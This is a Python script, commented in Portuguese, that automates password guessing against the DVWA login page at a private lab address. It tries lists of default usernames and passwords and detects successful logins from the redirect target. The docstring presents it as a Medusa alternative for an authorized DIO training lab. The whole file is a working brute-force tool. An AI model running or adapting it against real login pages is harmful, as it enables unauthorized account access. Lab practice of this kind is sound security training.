#!/usr/bin/env python3
"""Automacao de tentativas de login no DVWA (alternativa ao web-form do Medusa,
que nao trata o redirecionamento 302 do DVWA). Ambiente autorizado: laboratorio DIO."""
import requests, sys

ALVO = "http://172.17.54.106/dvwa/login.php"
USERS = ["admin", "msfadmin", "root", "user", "guest", "test"]
PASSWORDS = ["password", "123456", "admin", "msfadmin", "root", "toor", "qwerty", "letmein"]

s = requests.Session()
s.get(ALVO, timeout=5)
achados = []
for u in USERS:
    for p in PASSWORDS:
        try:
            r = s.post(ALVO, data={"username": u, "password": p, "Login": "Login"},
                       allow_redirects=False, timeout=5)
            # DVWA: correto => 302 Location: index.php ; errado => 302 Location: login.php
            location = r.headers.get("Location", "")
            if "index.php" in location:
                print(f"[SUCESSO] {u}:{p}  (Location: {location})")
                achados.append((u, p))
            else:
                print(f"[falha]   {u}:{p}")
        except Exception as e:
            print(f"[erro]    {u}:{p} -> {e}")
print(f"\nTotal de credenciais validas: {len(achados)}")
for u, p in achados:
    print(f"  {u}:{p}")
